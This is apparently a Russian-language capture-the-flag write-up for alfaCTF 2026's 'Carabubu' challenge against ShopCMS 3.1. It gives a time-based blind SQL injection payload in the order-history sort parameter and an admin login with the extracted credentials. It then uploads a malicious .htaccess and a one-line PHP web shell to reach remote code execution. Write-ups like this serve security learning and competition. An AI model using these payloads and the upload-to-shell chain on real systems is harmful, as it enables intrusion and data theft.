# Carabubu — alfaCTF 2026

**Категория:** Web / Pentest  
**Сложность:** Hard  
**Теги:** web, pentest, sqli, rce, php, shopcms, htaccess  
**Флаг:** `alfactf{YOuR_FREE_l1m1tEd_lABubu_lOCa7IoN}`

## Описание

Найти файл с координатами секретного дропа лимитированной серии Titanium Summit, который лежит где-то в корне сервера.

- **URL:** `https://carabubu-srv-hhv34z6f.alfactf.ru/`
- **Стек:** ShopCMS 3.1 Vip (русская PHP CMS для интернет-магазинов), PHP 5.3.29, nginx → Apache 2.4.10 (Debian)
- **БД:** MySQL, префикс таблиц `bdvo_`
- **Кодировка:** windows-1251 (русский магазин)

Цепочка атаки: регистрируемся как покупатель → blind SQLi достаёт креды админа → вход в админку → загрузка вредоносного `.htaccess` и `.txt`-шелла через загрузчик изображений товара → RCE → чтение бинарника `/get_gift_location`.

## Этап 1 — Регистрация покупателя

На сайте магазина есть форма регистрации: `/index.php?register=yes`.

- Капча включена, но использует **только цифры (0–9), длина 5–6 символов** — решается человеком за секунды.
- Включено подтверждение по email (`CONF_ENABLE_REGCONFIRMATION`), но пользователь всё равно может войти до подтверждения.

Регистрируем любой аккаунт, оформляем хотя бы один заказ через корзину (нужно для этапа 2 — должен быть непустой `bdvo_orders`), сохраняем cookie `PHPSESSID` после входа.

## Этап 2 — Time-based blind SQL-инъекция

### Уязвимая точка

```
GET /index.php?order_history=yes&search=1&sort=<PAYLOAD>
```

### Причина

В `core/includes/order_history.php` параметр `sort` передаётся в `callBackParam["sort"]` только через `mysql_real_escape_string` (которая не экранирует скобки и подзапросы):

```php
$callBackParam["sort"] = xEscSQL($_GET["sort"]);
```

Далее в функции `ordGetOrders()` (`core/functions/order_functions.php`) **нет проверки по белому списку** (в отличие от поиска товаров, где такая проверка есть):

```php
$order_by_clause .= " order by ".xEscSQL($callBackParam["sort"])." ";
```

Итоговый SQL:

```sql
SELECT ... FROM bdvo_orders WHERE customerID=X AND statusID!=0
ORDER BY <PAYLOAD>
```

### Почему стандартный SLEEP не работает

`(SELECT SLEEP(3))` оптимизируется MySQL как константное выражение в `ORDER BY` и фактически не выполняется.

### Ключевой трюк — реальная таблица в подзапросе

Оборачиваем `SLEEP` в подзапрос к **реальной таблице**, заставляя оптимизатор выполнить его:

```sql
ORDER BY (SELECT IF(условие, SLEEP(2), 0) FROM bdvo_orders LIMIT 1)
```

- **TRUE** (условие выполнено) → задержка ~2 с
- **FALSE** → ~0.3 с (базовое время)

Для этого нужен хотя бы один заказ в `bdvo_orders` (отсюда фиктивный заказ из этапа 1).

### Извлечение кредов

Бинарный поиск по символам, например:

```sql
(SELECT IF(ORD(SUBSTRING((SELECT Login FROM bdvo_customers
  WHERE actions LIKE '%"100"%' LIMIT 1),1,1))>109,
  SLEEP(2), 0) FROM bdvo_orders LIMIT 1)
```

Результат:

- Логин админа: `cara`
- Пароль админа (base64): `YnVidTIwMjY=`
- Пароль в открытом виде: `bubu2026`

> **Замечание:** ShopCMS хранит пароли как `base64_encode(plaintext)` без хеширования — тривиально обратимо.

## Этап 3 — Вход в админку

```
POST /admin.php
enter=1&user_login=cara&user_pw=bubu2026
```

HTTP 302 редирект → доступ к админ-панели подтверждён.

## Этап 4 — RCE через `.htaccess` + загрузку изображения товара

### Уязвимость

Загрузка изображений товаров в админке (`eaction=prod`, `save_pictures=1`) вызывает `UpdatePicturesUpload()`, которая использует `move_uploaded_file()` с именем файла от клиента — **без проверки расширения**:

```php
move_uploaded_file($fileset["ufilenameu"]["tmp_name"], "data/small/".$filename);
```

Корневой `.htaccess` блокирует `data/...php` (и подобные исполняемые расширения), но **не блокирует произвольные расширения вроде `.txt`**, и **не блокирует сам `.htaccess`**.

### Цепочка эксплуатации

**1. Загружаем вредоносный `.htaccess` в `data/small/`:**

```
POST /admin.php?eaction=prod&productID=1
Content-Type: multipart/form-data

save_pictures=1&...&ufilenameu_1=@.htaccess (filename=".htaccess")
```

Содержимое `.htaccess`:

```apache
AddType application/x-httpd-php .txt
```

Это заставляет Apache исполнять `.txt`-файлы как PHP в директории `data/small/`.

**2. Загружаем PHP-шелл как `shell.txt`:**

```
POST /admin.php?eaction=prod&productID=1
Content-Type: multipart/form-data

save_pictures=1&...&ufilenameu_1=@shell.txt (filename="shell.txt")
```

Содержимое `shell.txt`:

```php
<?php system($_GET["c"]); ?>
```

**3. Выполняем команды:**

```
GET /data/small/shell.txt?c=id
→ uid=33(www-data) gid=33(www-data)
```

## Этап 5 — Флаг

```
GET /data/small/shell.txt?c=/get_gift_location
```

`/get_gift_location` — скомпилированный ELF-бинарник в корне файловой системы, который выводит флаг (читает из `/var/tmp/`).

## Флаг

`alfactf{YOuR_FREE_l1m1tEd_lABubu_lOCa7IoN}`

## Сводка

| Этап | Техника |
|------|---------|
| 1 | Регистрация покупателя (цифровая капча) |
| 2 | ORDER BY time-based blind SQLi (трюк с реальной таблицей `bdvo_orders`) |
| 3 | Вход в админку с извлечёнными кредами (`cara` / `bubu2026`) |
| 4 | Загрузка `.htaccess` через изображение товара (нет проверки расширения) → PHP в `.txt` |
| 5 | RCE → чтение `/get_gift_location` |

## Файлы

Решающие скрипты: [`artifacts/`](artifacts/)

| Файл | Назначение |
|------|------------|
| `sqli.py` | Универсальный экстрактор для time-based blind SQLi |
| `exploit.py` | Сквозной драйвер: проверка сессии → извлечение кредов админа → подготовка к загрузке `.htaccess` |

Перед запуском подставьте свой `PHPSESSID` от залогиненного покупателя в `SID` / `SESS`.
